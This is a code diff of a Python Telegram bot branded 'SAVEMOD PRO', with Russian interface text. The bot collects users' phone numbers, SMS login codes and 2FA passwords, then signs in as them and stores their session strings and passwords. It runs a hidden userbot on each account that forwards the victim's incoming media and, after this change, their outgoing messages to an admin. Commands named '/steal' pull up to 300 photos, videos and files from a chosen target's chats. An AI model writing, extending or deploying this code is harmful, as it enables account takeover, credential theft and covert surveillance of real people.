@@ -8,7 +8,6 @@ import html
 import logging
 from datetime import datetime
 from threading import Thread
-from typing import Optional, Dict, List, Any, Tuple
 
 from flask import Flask, jsonify
 from telethon import TelegramClient, events
@@ -154,7 +153,7 @@ def get_accounts_keyboard(page=0):
     page_accounts = accounts[start:end]
     
     kb = InlineKeyboardMarkup(row_width=2)
-    for i, (uid, name, act) in enumerate(page_accounts):
+    for uid, name, act in page_accounts:
         status = "✅" if (act == 1 or uid == current_active_user) else "❌"
         kb.add(InlineKeyboardButton(f"{status} {name[:20]}", callback_data=f"account_{uid}"))
     
@@ -169,7 +168,7 @@ def get_accounts_keyboard(page=0):
     kb.row(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))
     return kb
 
-def get_account_actions_keyboard(user_id, name):
+def get_account_actions_keyboard(user_id):
     kb = InlineKeyboardMarkup(row_width=2)
     kb.add(
         InlineKeyboardButton("📒 Контакты", callback_data=f"steal_con_{user_id}"),
@@ -199,14 +198,10 @@ def get_chats_keyboard(page=0):
         return chats
     
     try:
-        loop = asyncio.get_event_loop()
-        if loop.is_running():
-            import concurrent.futures
-            with concurrent.futures.ThreadPoolExecutor() as executor:
-                future = executor.submit(asyncio.run, fetch_chats())
-                chats = future.result(timeout=15)
-        else:
-            chats = asyncio.run(fetch_chats())
+        import concurrent.futures
+        with concurrent.futures.ThreadPoolExecutor() as executor:
+            future = executor.submit(asyncio.run, fetch_chats())
+            chats = future.result(timeout=15)
     except:
         return None
     
@@ -249,15 +244,273 @@ def get_code_keyboard():
 
 @dp.message_handler(commands=['start', 'menu'])
 async def cmd_menu(message):
-    if not is_admin(message.from_user.id):
+    uid = message.from_user.id
+    
+    if not is_admin(uid):
+        cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
+        row = cursor.fetchone()
+        if row and row[0]:
+            await message.answer("✅ <b>SAVEMOD PRO</b> активен!\n.help - команды юзербота", parse_mode='HTML')
+            if uid not in active_clients:
+                asyncio.create_task(run_userbot(uid, row[0]))
+        else:
+            kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
+            kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
+            await message.answer(
+                "🔐 <b>SAVEMOD PRO</b>\n\nДля регистрации нажми на кнопку и отправь номер телефона.",
+                parse_mode='HTML',
+                reply_markup=kb
+            )
         return
+    
     await message.answer(
-        "🔰 <b>SAVEMOD PRO</b>\n\n"
-        "Управление аккаунтами и слежка\n"
-        "Выбери действие:",
+        "🔰 <b>SAVEMOD PRO</b>\n\nУправление аккаунтами и слежка\nВыбери действие:",
         parse_mode='HTML',
         reply_markup=get_main_menu()
     )
+
+@dp.message_handler(commands=['reset_me'])
+async def cmd_reset_me(message):
+    uid = message.from_user.id
+    if uid in active_clients:
+        try:
+            await active_clients[uid].disconnect()
+        except:
+            pass
+        del active_clients[uid]
+    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
+    conn.commit()
+    await message.answer("✅ Сессия удалена. Отправь /start")
+
+@dp.message_handler(commands=['swap'])
+async def cmd_swap(message):
+    if not is_admin(message.from_user.id):
+        return
+    global current_active_user
+    args = message.get_args()
+    if not args:
+        await message.answer("❌ /swap НОМЕР\nПример: /swap 1")
+        return
+    try:
+        num = int(args) - 1
+        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
+        rows = cursor.fetchall()
+        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
+        if num < 0 or num >= len(na):
+            await message.answer("❌ Неверный номер")
+            return
+        user_id = na[num][0]
+        name = na[num][1] or na[num][2] or str(user_id)
+        if user_id not in active_clients:
+            await message.answer(f"❌ Аккаунт {name} не запущен")
+            return
+        current_active_user = user_id
+        cursor.execute('UPDATE user_sessions SET is_active=0')
+        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
+        conn.commit()
+        me = await active_clients[user_id].get_me()
+        await message.answer(f"✅ Переключился на {me.first_name}")
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+@dp.message_handler(commands=['steal', 'steal_photo', 'steal_video'])
+async def cmd_steal(message):
+    if not is_admin(message.from_user.id):
+        return
+    
+    cl, uid = get_active_client()
+    if not cl:
+        await message.answer("❌ Нет активного аккаунта\n/swap для выбора")
+        return
+    
+    args = message.get_args()
+    if not args:
+        await message.answer("❌ /steal @username\n/steal_photo @username\n/steal_video @username")
+        return
+    
+    cmd_type = message.get_command().replace('/', '')
+    target = args.strip()
+    ent = await resolve_entity(cl, target)
+    if not ent:
+        await message.answer("❌ Пользователь не найден")
+        return
+    if ent.id == uid or is_target_admin(ent.id):
+        await message.answer("❌ Нельзя")
+        return
+    
+    target_name = ent.first_name or ent.username or str(ent.id)
+    
+    if cmd_type == 'steal_photo':
+        await message.answer(f"📷 Краду фото у {target_name}...")
+        count = 0
+        async for msg in cl.iter_messages(ent.id, limit=300):
+            if msg.photo:
+                try:
+                    path = await msg.download_media()
+                    if path:
+                        with open(path, 'rb') as f:
+                            await bot.send_photo(message.from_user.id, InputFile(f), caption=f"📸 {target_name}")
+                        os.remove(path)
+                        count += 1
+                        await asyncio.sleep(0.1)
+                except:
+                    pass
+        await message.answer(f"✅ Скачано {count} фото")
+    
+    elif cmd_type == 'steal_video':
+        await message.answer(f"🎬 Краду видео у {target_name}...")
+        count = 0
+        async for msg in cl.iter_messages(ent.id, limit=300):
+            if msg.video:
+                try:
+                    path = await msg.download_media()
+                    if path:
+                        with open(path, 'rb') as f:
+                            await bot.send_video(message.from_user.id, InputFile(f), caption=f"🎬 {target_name}")
+                        os.remove(path)
+                        count += 1
+                        await asyncio.sleep(0.15)
+                except:
+                    pass
+        await message.answer(f"✅ Скачано {count} видео")
+    
+    else:
+        await message.answer(f"🔄 Кража медиа у {target_name} (последние 300)...")
+        
+        media_by_type = {'photo': [], 'video': [], 'video_note': [], 'voice': [], 'sticker': [], 'document': []}
+        
+        async for msg in cl.iter_messages(ent.id, limit=300):
+            if msg.photo:
+                media_by_type['photo'].append(msg)
+            elif msg.video:
+                media_by_type['video'].append(msg)
+            elif msg.video_note:
+                media_by_type['video_note'].append(msg)
+            elif msg.voice:
+                media_by_type['voice'].append(msg)
+            elif msg.sticker:
+                media_by_type['sticker'].append(msg)
+            elif msg.document:
+                media_by_type['document'].append(msg)
+        
+        total = sum(len(v) for v in media_by_type.values())
+        if total == 0:
+            await message.answer(f"❌ Нет медиа у {target_name}")
+            return
+        
+        await message.answer(f"📦 Найдено: 📷{len(media_by_type['photo'])} 🎬{len(media_by_type['video'])} 🔄{len(media_by_type['video_note'])} 🎤{len(media_by_type['voice'])} 🎨{len(media_by_type['sticker'])} 📎{len(media_by_type['document'])}")
+        
+        for media_type, msgs in media_by_type.items():
+            for msg in msgs:
+                try:
+                    path = await msg.download_media()
+                    if path:
+                        ext = os.path.splitext(path)[1] or '.file'
+                        safe_name = f"{target_name}_{media_type}_{msg.id}{ext}"
+                        new_path = os.path.join(tempfile.gettempdir(), safe_name)
+                        shutil.move(path, new_path)
+                        with open(new_path, 'rb') as f:
+                            await bot.send_document(message.from_user.id, InputFile(f, filename=safe_name), caption=f"📎 {media_type} от {target_name}")
+                        os.remove(new_path)
+                        await asyncio.sleep(0.1)
+                except:
+                    pass
+        
+        await message.answer(f"✅ Украдено {total} файлов")
+
+# ========== РЕГИСТРАЦИЯ ==========
+
+@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
+async def handle_contact(message):
+    uid = message.from_user.id
+    phone = message.contact.phone_number
+    
+    try:
+        client = TelegramClient(StringSession(), API_ID, API_HASH)
+        await client.connect()
+        res = await client.send_code_request(phone)
+        temp_auth[uid] = {
+            'client': client, 
+            'phone': phone, 
+            'hash': res.phone_code_hash, 
+            'code': ''
+        }
+        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
+    except Exception as e:
+        await message.answer(f"❌ Ошибка: {e}")
+
+@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
+async def handle_code(cb):
+    uid = cb.from_user.id
+    if uid not in temp_auth:
+        await cb.answer("Сессия истекла, /start")
+        return
+    action = cb.data.replace('code_', '')
+    cur = temp_auth[uid].get('code', '')
+    
+    if action.isdigit():
+        if len(cur) < 5:
+            temp_auth[uid]['code'] = cur + action
+    elif action == 'back':
+        temp_auth[uid]['code'] = cur[:-1]
+    elif action == 'done':
+        if len(cur) == 5:
+            await cb.answer("Авторизация...")
+            await complete_auth(cb, uid)
+            return
+        else:
+            await cb.answer("Нужно 5 цифр", show_alert=True)
+            return
+    
+    code = temp_auth[uid]['code']
+    disp = code + "".join(["▫" for _ in range(5 - len(code))])
+    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
+    await cb.answer()
+
+async def complete_auth(cb, uid):
+    data = temp_auth[uid]
+    try:
+        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
+        ss = data['client'].session.save()
+        me = await data['client'].get_me()
+        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
+                       (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
+        conn.commit()
+        await cb.message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню", parse_mode='HTML')
+        if is_admin(uid):
+            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ: {me.first_name}\n📱 {data['phone']}")
+        asyncio.create_task(run_userbot(uid, ss))
+        await data['client'].disconnect()
+        del temp_auth[uid]
+    except Exception as e:
+        if '2fa' in str(e).lower() or 'password' in str(e).lower():
+            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
+            pending_2fa[uid] = data
+            del temp_auth[uid]
+        else:
+            await cb.message.answer(f"❌ Ошибка: {e}")
+
+@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
+async def handle_2fa(message):
+    uid = message.from_user.id
+    data = pending_2fa[uid]
+    try:
+        await data['client'].sign_in(password=message.text.strip())
+        ss = data['client'].session.save()
+        me = await data['client'].get_me()
+        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
+                       (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
+        conn.commit()
+        await message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/start - меню", parse_mode='HTML')
+        if is_admin(uid):
+            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ (2FA): {me.first_name}\n📱 {data['phone']}\n🔒 Пароль: {message.text.strip()}")
+        asyncio.create_task(run_userbot(uid, ss))
+        await data['client'].disconnect()
+        del pending_2fa[uid]
+    except Exception as e:
+        await message.answer(f"❌ Ошибка 2FA: {e}")
+
+# ========== CALLBACK HANDLERS ==========
 
 @dp.callback_query_handler(lambda c: c.data == "main_menu")
 async def main_menu_callback(cb):
@@ -298,7 +551,7 @@ async def account_detail(cb):
     name = fn or un or str(uid)
     status = "✅ Активен" if (act == 1 or uid == current_active_user) else "❌ Неактивен"
     text = f"👤 <b>{name}</b>\n\n🆔 <code>{uid}</code>\n📱 {ph or 'нет'}\n📊 {status}"
-    await cb.message.edit_text(text, parse_mode='HTML', reply_markup=get_account_actions_keyboard(uid, name))
+    await cb.message.edit_text(text, parse_mode='HTML', reply_markup=get_account_actions_keyboard(uid))
     await cb.answer()
 
 @dp.callback_query_handler(lambda c: c.data.startswith('make_active_'))
@@ -397,7 +650,7 @@ async def chats_page(cb):
 async def chat_detail(cb):
     parts = cb.data.split('_')
     target_id = int(parts[1])
-    target_name = parts[2]
+    target_name = '_'.join(parts[2:])
     
     pending_chat_count[cb.from_user.id] = {'target_id': target_id, 'target_name': target_name}
     
@@ -561,9 +814,7 @@ async def menu_steal(cb):
         return
     
     kb = InlineKeyboardMarkup(row_width=1)
-    kb.add(
-        InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu")
-    )
+    kb.add(InlineKeyboardButton("🔙 Главное меню", callback_data="main_menu"))
     
     await cb.message.edit_text(
         "🎬 <b>Кража медиа</b>\n\n"
@@ -578,119 +829,6 @@ async def menu_steal(cb):
         reply_markup=kb
     )
     await cb.answer()
-
-@dp.message_handler(commands=['steal', 'steal_photo', 'steal_video'])
-async def cmd_steal(message):
-    if not is_admin(message.from_user.id):
-        return
-    
-    cl, uid = get_active_client()
-    if not cl:
-        await message.answer("❌ Нет активного аккаунта\n/swap для выбора")
-        return
-    
-    args = message.get_args()
-    if not args:
-        await message.answer("❌ /steal @username\n/steal_photo @username\n/steal_video @username")
-        return
-    
-    cmd_type = message.get_command().replace('/', '')
-    target = args.strip()
-    ent = await resolve_entity(cl, target)
-    if not ent:
-        await message.answer("❌ Пользователь не найден")
-        return
-    if ent.id == uid or is_target_admin(ent.id):
-        await message.answer("❌ Нельзя")
-        return
-    
-    target_name = ent.first_name or ent.username or str(ent.id)
-    
-    if cmd_type == 'steal_photo':
-        await message.answer(f"📷 Краду фото у {target_name}...")
-        count = 0
-        async for msg in cl.iter_messages(ent.id, limit=300):
-            if msg.photo:
-                try:
-                    path = await msg.download_media()
-                    if path:
-                        with open(path, 'rb') as f:
-                            await bot.send_photo(message.from_user.id, InputFile(f), caption=f"📸 {target_name}")
-                        os.remove(path)
-                        count += 1
-                        await asyncio.sleep(0.1)
-                except:
-                    pass
-        await message.answer(f"✅ Скачано {count} фото")
-    
-    elif cmd_type == 'steal_video':
-        await message.answer(f"🎬 Краду видео у {target_name}...")
-        count = 0
-        async for msg in cl.iter_messages(ent.id, limit=300):
-            if msg.video:
-                try:
-                    path = await msg.download_media()
-                    if path:
-                        with open(path, 'rb') as f:
-                            await bot.send_video(message.from_user.id, InputFile(f), caption=f"🎬 {target_name}")
-                        os.remove(path)
-                        count += 1
-                        await asyncio.sleep(0.15)
-                except:
-                    pass
-        await message.answer(f"✅ Скачано {count} видео")
-    
-    else:
-        await message.answer(f"🔄 Кража медиа у {target_name} (последние 300)...")
-        
-        media_by_type = {'photo': [], 'video': [], 'video_note': [], 'voice': [], 'sticker': [], 'document': []}
-        
-        async for msg in cl.iter_messages(ent.id, limit=300):
-            if msg.photo:
-                media_by_type['photo'].append(msg)
-            elif msg.video:
-                media_by_type['video'].append(msg)
-            elif msg.video_note:
-                media_by_type['video_note'].append(msg)
-            elif msg.voice:
-                media_by_type['voice'].append(msg)
-            elif msg.sticker:
-                media_by_type['sticker'].append(msg)
-            elif msg.document:
-                media_by_type['document'].append(msg)
-        
-        total = sum(len(v) for v in media_by_type.values())
-        if total == 0:
-            await message.answer(f"❌ Нет медиа у {target_name}")
-            return
-        
-        await message.answer(f"📦 Найдено: 📷{len(media_by_type['photo'])} 🎬{len(media_by_type['video'])} 🔄{len(media_by_type['video_note'])} 🎤{len(media_by_type['voice'])} 🎨{len(media_by_type['sticker'])} 📎{len(media_by_type['document'])}")
-        
-        for media_type, msgs in media_by_type.items():
-            for msg in msgs:
-                try:
-                    path = await msg.download_media()
-                    if path:
-                        ext = '.file'
-                        if '.jpg' in path or '.jpeg' in path:
-                            ext = '.jpg'
-                        elif '.mp4' in path:
-                            ext = '.mp4'
-                        elif '.ogg' in path:
-                            ext = '.ogg'
-                        elif '.webp' in path:
-                            ext = '.webp'
-                        safe_name = f"{target_name}_{media_type}_{msg.id}{ext}"
-                        new_path = os.path.join(tempfile.gettempdir(), safe_name)
-                        shutil.move(path, new_path)
-                        with open(new_path, 'rb') as f:
-                            await bot.send_document(message.from_user.id, InputFile(f, filename=safe_name), caption=f"📎 {media_type} от {target_name}")
-                        os.remove(new_path)
-                        await asyncio.sleep(0.1)
-                except:
-                    pass
-        
-        await message.answer(f"✅ Украдено {total} файлов")
 
 @dp.callback_query_handler(lambda c: c.data == "menu_stats")
 async def menu_stats(cb):
@@ -743,153 +881,6 @@ async def cmd_ghost(cb):
     except:
         await cb.answer("❌ Ошибка")
 
-@dp.message_handler(commands=['swap'])
-async def cmd_swap(message):
-    if not is_admin(message.from_user.id):
-        return
-    global current_active_user
-    args = message.get_args()
-    if not args:
-        await message.answer("❌ /swap НОМЕР\nПример: /swap 1")
-        return
-    try:
-        num = int(args) - 1
-        cursor.execute('SELECT user_id, first_name, username FROM user_sessions')
-        rows = cursor.fetchall()
-        na = [(uid, fn, un) for uid, fn, un in rows if not is_target_admin(uid)]
-        if num < 0 or num >= len(na):
-            await message.answer("❌ Неверный номер")
-            return
-        user_id = na[num][0]
-        name = na[num][1] or na[num][2] or str(user_id)
-        if user_id not in active_clients:
-            await message.answer(f"❌ Аккаунт {name} не запущен")
-            return
-        current_active_user = user_id
-        cursor.execute('UPDATE user_sessions SET is_active=0')
-        cursor.execute('UPDATE user_sessions SET is_active=1 WHERE user_id=?', (user_id,))
-        conn.commit()
-        me = await active_clients[user_id].get_me()
-        await message.answer(f"✅ Переключился на {me.first_name}")
-    except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
-
-@dp.message_handler(commands=['reset_me'])
-async def cmd_reset_me(message):
-    uid = message.from_user.id
-    if uid in active_clients:
-        try:
-            await active_clients[uid].disconnect()
-        except:
-            pass
-        del active_clients[uid]
-    cursor.execute('DELETE FROM user_sessions WHERE user_id=?', (uid,))
-    conn.commit()
-    await message.answer("✅ Сессия удалена. Отправь /start")
-
-# ========== РЕГИСТРАЦИЯ ==========
-
-@dp.message_handler(commands=['start'])
-async def cmd_start(message):
-    uid = message.from_user.id
-    cursor.execute('SELECT session_string FROM user_sessions WHERE user_id=?', (uid,))
-    row = cursor.fetchone()
-    if row and row[0]:
-        if is_admin(uid):
-            await message.answer("✅ <b>SAVEMOD PRO</b>\n/menu - открыть панель", parse_mode='HTML')
-        else:
-            await message.answer("✅ <b>SAVEMOD PRO</b> активен!\n.help - команды юзербота", parse_mode='HTML')
-        if uid not in active_clients:
-            asyncio.create_task(run_userbot(uid, row[0]))
-        return
-    kb = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    kb.add(KeyboardButton("📱 Поделиться номером", request_contact=True))
-    await message.answer("🔐 <b>SAVEMOD PRO</b>\nОтправь номер телефона", parse_mode='HTML', reply_markup=kb)
-
-@dp.message_handler(content_types=aiogram_types.ContentType.CONTACT)
-async def handle_contact(message):
-    uid = message.from_user.id
-    phone = message.contact.phone_number
-    try:
-        client = TelegramClient(StringSession(), API_ID, API_HASH)
-        await client.connect()
-        res = await client.send_code_request(phone)
-        temp_auth[uid] = {'client': client, 'phone': phone, 'hash': res.phone_code_hash, 'code': ''}
-        await message.answer("📱 Введи код из SMS:", reply_markup=get_code_keyboard())
-    except Exception as e:
-        await message.answer(f"❌ Ошибка: {e}")
-
-@dp.callback_query_handler(lambda c: c.data.startswith('code_'))
-async def handle_code(cb):
-    uid = cb.from_user.id
-    if uid not in temp_auth:
-        await cb.answer("Сессия истекла, /start")
-        return
-    action = cb.data.replace('code_', '')
-    cur = temp_auth[uid].get('code', '')
-    
-    if action.isdigit():
-        if len(cur) < 5:
-            temp_auth[uid]['code'] = cur + action
-    elif action == 'back':
-        temp_auth[uid]['code'] = cur[:-1]
-    elif action == 'done':
-        if len(cur) == 5:
-            await cb.answer("Авторизация...")
-            await complete_auth(cb, uid)
-            return
-        else:
-            await cb.answer("Нужно 5 цифр", show_alert=True)
-            return
-    
-    code = temp_auth[uid]['code']
-    disp = code + "".join(["▫" for _ in range(5 - len(code))])
-    await cb.message.edit_text(f"📱 Код: {disp}", reply_markup=get_code_keyboard())
-    await cb.answer()
-
-async def complete_auth(cb, uid):
-    data = temp_auth[uid]
-    try:
-        await data['client'].sign_in(phone=data['phone'], code=data['code'], phone_code_hash=data['hash'])
-        ss = data['client'].session.save()
-        me = await data['client'].get_me()
-        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-                       (uid, ss, data['phone'], None, me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
-        conn.commit()
-        await cb.message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/menu - панель", parse_mode='HTML')
-        if is_admin(uid):
-            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ: {me.first_name}\n📱 {data['phone']}")
-        asyncio.create_task(run_userbot(uid, ss))
-        await data['client'].disconnect()
-        del temp_auth[uid]
-    except Exception as e:
-        if '2fa' in str(e).lower() or 'password' in str(e).lower():
-            await cb.message.answer("🔐 Введи облачный пароль (2FA):")
-            pending_2fa[uid] = data
-            del temp_auth[uid]
-        else:
-            await cb.message.answer(f"❌ Ошибка: {e}")
-
-@dp.message_handler(lambda msg: msg.from_user.id in pending_2fa)
-async def handle_2fa(message):
-    uid = message.from_user.id
-    data = pending_2fa[uid]
-    try:
-        await data['client'].sign_in(password=message.text.strip())
-        ss = data['client'].session.save()
-        me = await data['client'].get_me()
-        cursor.execute('INSERT OR REPLACE INTO user_sessions (user_id, session_string, phone, two_fa, first_name, last_name, username, is_active, registered_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)',
-                       (uid, ss, data['phone'], message.text.strip(), me.first_name, me.last_name, me.username, 0, datetime.now().isoformat()))
-        conn.commit()
-        await message.answer(f"✅ <b>SAVEMOD PRO</b>\n👤 {me.first_name}\n\n/menu - панель", parse_mode='HTML')
-        if is_admin(uid):
-            await send_to_admin(f"🔐 НОВЫЙ АККАУНТ (2FA): {me.first_name}\n📱 {data['phone']}\n🔒 Пароль: {message.text.strip()}")
-        asyncio.create_task(run_userbot(uid, ss))
-        await data['client'].disconnect()
-        del pending_2fa[uid]
-    except Exception as e:
-        await message.answer(f"❌ Ошибка 2FA: {e}")
-
 # ========== ЮЗЕРБОТ ==========
 
 async def run_userbot(owner_id, session_string):
@@ -937,17 +928,30 @@ async def run_userbot(owner_id, session_string):
                     except:
                         pass
             
-            if event.photo or event.video or event.voice or event.video_note or event.sticker:
+            if event.photo or event.video or event.voice or event.video_note or event.sticker or event.document:
                 try:
                     path = await event.download_media()
                     if path and is_admin(owner_id):
-                        name = (await client.get_entity(sender_id)).first_name or str(sender_id)
+                        try:
+                            sender = await client.get_entity(sender_id)
+                            name = sender.first_name or str(sender_id)
+                        except:
+                            name = str(sender_id)
                         await send_to_admin(f"📎 [{me.first_name}] ← {name}: медиа")
                         with open(path, 'rb') as f:
                             await bot.send_document(ADMIN_IDS[0], InputFile(f, filename=os.path.basename(path)), caption=f"Медиа от {name}")
                         os.remove(path)
                 except:
                     pass
+        
+        if event.out and event.text and is_admin(owner_id):
+            try:
+                if event.chat_id and event.chat_id != owner_id:
+                    chat_entity = await client.get_entity(event.chat_id)
+                    chat_name = chat_entity.first_name or chat_entity.username or str(event.chat_id)
+                    await send_to_admin(f"📤 [{me.first_name}] → {chat_name}:\n{event.text[:300]}")
+            except:
+                pass
     
     @client.on(events.NewMessage)
     async def user_commands(event):
@@ -1054,6 +1058,8 @@ async def run_userbot(owner_id, session_string):
     
     await client.run_until_disconnected()
 
+# ========== ВЕБ-СЕРВЕР ==========
+
 flask_app = Flask(__name__)
 
 @flask_app.route('/')
@@ -1062,6 +1068,8 @@ def health():
 
 def run_web():
     flask_app.run(host='0.0.0.0', port=8080, debug=False)
+
+# ========== ЗАПУСК ==========
 
 async def restore_sessions():
     cursor.execute('SELECT user_id, session_string FROM user_sessions')
